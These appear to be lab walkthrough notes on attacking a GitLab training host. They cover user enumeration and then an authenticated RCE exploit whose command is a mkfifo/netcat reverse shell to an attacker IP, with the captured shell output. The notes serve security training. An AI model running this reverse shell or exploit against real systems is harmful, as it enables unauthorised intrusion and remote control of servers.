## Username Enumeration

We can write one ourselves in Bash or Python or use [this one](https://www.exploit-db.com/exploits/49821) to enumerate a list of valid users. The Python3 version of this same tool can be found [here](https://github.com/dpgg101/GitLabUserEnum).

```shell
3kjS@htb[/htb]$ ./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
```
![](Screenshot%202026-08-02%20at%2010.40.36.png)
## Authenticated Remote Code Execution

We can use this [exploit](https://www.exploit-db.com/exploits/49951) to achieve RCE.

```shell
3kjS@htb[/htb]$ python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
```

And we get a shell almost instantly.

```shell
3kjS@htb[/htb]$ nc -lnvp 8443 

listening on [any] 8443 ... 
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.88] 60054 

git@app04:~/gitlab-workhorse$ id 

id 
uid=996(git) gid=997(git) groups=997(git) 

git@app04:~/gitlab-workhorse$ ls 

ls 
VERSION 
config.toml 
flag_gitlab.txt 
sockets
```
